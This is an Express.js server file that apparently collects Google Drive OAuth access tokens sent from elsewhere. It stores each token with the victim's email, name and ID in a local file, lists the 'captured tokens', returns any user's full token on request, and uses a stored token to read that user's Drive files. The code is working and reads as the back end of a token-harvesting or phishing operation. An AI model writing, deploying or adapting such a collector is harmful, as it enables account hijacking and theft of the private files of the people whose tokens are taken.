// Example Node.js/Express backend to receive and store Google Drive tokens
// Install dependencies: npm install express cors body-parser

const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Storage file for tokens (use a database in production)
const TOKENS_FILE = path.join(__dirname, 'tokens.json');

// Initialize tokens file if it doesn't exist
async function initTokensFile() {
    try {
        await fs.access(TOKENS_FILE);
    } catch {
        await fs.writeFile(TOKENS_FILE, JSON.stringify([], null, 2));
    }
}

// Endpoint to receive and store tokens
app.post('/api/store-token', async (req, res) => {
    try {
        const { accessToken, expiresIn, scope, tokenType, userInfo, timestamp } = req.body;

        if (!accessToken) {
            return res.status(400).json({ error: 'Access token is required' });
        }

        // Read existing tokens
        const tokensData = await fs.readFile(TOKENS_FILE, 'utf-8');
        const tokens = JSON.parse(tokensData);

        // Add new token with user info
        const tokenEntry = {
            id: tokens.length + 1,
            accessToken,
            expiresIn,
            scope,
            tokenType,
            userInfo: {
                email: userInfo.email,
                name: userInfo.name,
                id: userInfo.id,
                picture: userInfo.picture
            },
            timestamp,
            capturedAt: new Date().toISOString()
        };

        tokens.push(tokenEntry);

        // Save tokens
        await fs.writeFile(TOKENS_FILE, JSON.stringify(tokens, null, 2));

        console.log(`âœ“ Token stored for user: ${userInfo.email}`);

        res.json({
            success: true,
            message: 'Token stored successfully',
            userId: userInfo.id
        });

    } catch (error) {
        console.error('Error storing token:', error);
        res.status(500).json({ error: 'Failed to store token' });
    }
});

// Endpoint to list all captured tokens (for your viewing)
app.get('/api/tokens', async (req, res) => {
    try {
        const tokensData = await fs.readFile(TOKENS_FILE, 'utf-8');
        const tokens = JSON.parse(tokensData);

        // Return tokens with masked access tokens for security
        const maskedTokens = tokens.map(t => ({
            ...t,
            accessToken: t.accessToken.substring(0, 20) + '...'
        }));

        res.json(maskedTokens);
    } catch (error) {
        console.error('Error reading tokens:', error);
        res.status(500).json({ error: 'Failed to read tokens' });
    }
});

// Endpoint to get a specific token (use with caution)
app.get('/api/token/:userId', async (req, res) => {
    try {
        const tokensData = await fs.readFile(TOKENS_FILE, 'utf-8');
        const tokens = JSON.parse(tokensData);

        const token = tokens.find(t => t.userInfo.id === req.params.userId);

        if (!token) {
            return res.status(404).json({ error: 'Token not found' });
        }

        res.json(token);
    } catch (error) {
        console.error('Error reading token:', error);
        res.status(500).json({ error: 'Failed to read token' });
    }
});

// Endpoint to test accessing user's Google Drive
app.get('/api/drive-files/:userId', async (req, res) => {
    try {
        const tokensData = await fs.readFile(TOKENS_FILE, 'utf-8');
        const tokens = JSON.parse(tokensData);

        const token = tokens.find(t => t.userInfo.id === req.params.userId);

        if (!token) {
            return res.status(404).json({ error: 'Token not found' });
        }

        // Fetch user's Google Drive files
        const response = await fetch('https://www.googleapis.com/drive/v3/files?pageSize=10', {
            headers: {
                'Authorization': `Bearer ${token.accessToken}`
            }
        });

        const data = await response.json();

        res.json({
            user: token.userInfo.email,
            files: data.files || [],
            error: data.error
        });

    } catch (error) {
        console.error('Error fetching drive files:', error);
        res.status(500).json({ error: 'Failed to fetch drive files' });
    }
});

// Start server
async function start() {
    await initTokensFile();
    app.listen(PORT, () => {
        console.log(`ðŸš€ Backend server running on http://localhost:${PORT}`);
        console.log(`ðŸ“ Tokens will be stored in: ${TOKENS_FILE}`);
    });
}

start();